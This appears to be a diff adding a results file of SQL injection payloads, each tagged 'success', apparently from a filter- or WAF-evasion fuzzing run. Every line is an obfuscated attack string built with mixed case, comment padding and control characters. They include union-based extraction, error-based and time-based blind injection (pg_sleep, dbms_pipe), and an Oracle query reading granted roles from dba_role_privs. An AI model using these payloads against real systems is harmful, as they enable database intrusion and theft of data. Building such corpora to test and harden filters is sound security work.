@@ -1,0 +1,41 @@
+5 success "0x1' And   (  seLECT 0x236b frOM  (  sElECT count  (  *  )  ,concat  (  0x7171706a71,  (/*7jv-*/ SEleCt   (  elt  (  7400 IN (7399,7400,7401),1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x fRom information_schema.character_sets group by x  )  a  )   "
+7 success "1'\tWHERe 6626 not like (SeLeCt 6627) "
+22 success "SelECT pg_sleep  (  0x5  )   &&/**//**/  (    (   'vxxg'   LIKE /**/ 'vxxg "
+24 success '-2378" WHErE 2686  =  2686 anD 9358 like 9358 or 0\x0bAnD 1 OR 6872 /**/=  6872-- ,H'
+25 success "-0x10ea'\nunion/**/all select/**/3059,3059,3059,0xbf3,3059,3059,(SELECT 3059),3059,3059-- "
+29 success 'EnD aNd  \n (    (   2160  =  2160 '
+30 success "-(SELECT 6220)' union/**/all select 0x5b6,1462# 3k"
+36 success '1"\tWhere\n1437 NOT LIKE 1438 aNd 1/**/'
+41 success ' sElECt * fRom users WHere id  =  1 OR ".  )  " OR (SELECT 1)  =  1 -- 1 m!'
+44 success '0x1  )   AS bpap WHERE 7758   LIKE   7758 AND True OR 4240   LIKE     (  SelECt (SELECT 4240) froM/*}B */pg_sleep  (  0x5   )    ) \x0b\x0c-- |'
+47 success "(SelECT 0x1),  (  sELECT   (  caSE wHEN   (  '7L><z' lIKE '7L><z' OR False  )   theN 0x1 eLSE cast  (\t 0x1 aS int  )  /  (  sELect 0x0\nFroM dual /**/)   End  ) /**/ from dual  )   "
+48 success 'SeLEcT   (  cASe wHeN   (  9393   lIKe   0x159a  )   THEn 9393 eLSe cast  (  1 AS int  )  /  (  SelEct 0 from dual  ) \x0b eNd  )  /**/froM dual-- '
+49 success 'SELECT   (  caSE WhEn/**/  (  0x2321   LiKe   (Select 8846)  )   tHEn (sEleCT 8993) else 0x2321*  (  SeLECT 8993 fRoM mysql.db\x0c )   ENd  )  #\x0b?'
+55 success '-9541  )   AS bnky WHERe 3934/**/  LIKE   3934/**/union all seleCT 3934,3934,3934# '
+61 success " OR 'something'    lIKe\xa0   'some'+'thing' "
+67 success "-1256'\tIn boolean mode  ) /**/ union all sELect 7889,7889,7889,7889,7889,7889,7889,(SEleCt 7889),7889-- "
+71 success ' seleCT * FROM users whERe id   LIKE   1 Or 1#"? union seleCT null,version  (    )   -- 1 \t|rf'
+72 success 'SElecT '
+74 success "-9574'  )   AS rxym Where 4719   like   4719 OR 3505 NOT IN (3504,3505,3506) union all seLeCt 4719,4719,4719,4719,4719,4719,4719--\t"
+80 success '1/**/order\x0cby 0x1-- '
+82 success "1'+  (  sELECT iutk whErE 6158   liKe   6158 "
+85 success ' SeLEcT * FrOm users WheRe id  =  1 || 1#"1 union seLecT \'a\',version  (    )   -- 0x1 '
+86 success '-9891" union\nall/**/select 7489#/*:(SELECT 8)*/8&'
+88 success "1'/**/where\t8635  =  8635 AND (SELECT 3145) not like 0xc4a order by 1-- "
+94 success '0x1" WheRE 4366  =  4366 && 0x2078  = /**/dbms_pipe.receive_message  (  chr  (/**/ 69  )  ||chr  (  79  )  ||chr  (  (SELECT 101)  )  ||chr  (  68  )  ,5  )  -- E`'
+95 success '-0x125b  )   As mymz WHeRE 0xd4d   LIke   (seLEcT 3405) Or elt  (  9735 LIke 9735,3623 \x0c)  -- '
+96 success ' SeLECt * FRoM users wherE id   LIKe   1 OR 1#"{ union SeLEcT null,version  (    )   -- 1 '
+97 success '-9356 OR elt  (  1032  =\x0c/**/1032,3623  )  -- izgi sqz'
+101 success '0x1 where 2060   LIKE  \t(SELECT 2060) '
+102 success "1'/**/wHErE 4253   LIKE   4253 "
+103 success '0x1" WhEre 0xdb6   liKE  \xa00xdb6\n'
+106 success '-(SelECt 1447)"/**/union\xa0all/**/sELeCt 3013,3013,3013,3013,3013,3013,3013--/*K%*/'
+108 success "-4828'+  ( \x0cSelect qxnw wHeRE 9488/**/ =  0x2510 union all sElect 9488,9488-- "
+112 success '0x1" order by\x0b0x1# '
+113 success '-0x817/**/union all select 4753,4753-- '
+114 success "1'/**/wHeRe '\\'<>'\\C'/**/"
+118 success "selECT count  (  *  )   fRom sysibm.systables As t1,sysibm.systables as t2,sysibm.systables As t3  AnD     (    (\t    (  'vcgc' likE 'vcgc "
+124 success '0x1"\xa0&& elt  (  6180<>6181 OR False/**/OR False,7259 /**/)   '
+133 success " AND 0x1   like   utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  1   )    )    AND 'i'   LIKE   'i "
+135 success 'seleCT count  (  *  )   froM domain.domains As t1,domain.columns as t2,domain.tables As t3# kuqm '
+137 success " having 'o'\x0bNOT LIKE 'o-' OR False-- "
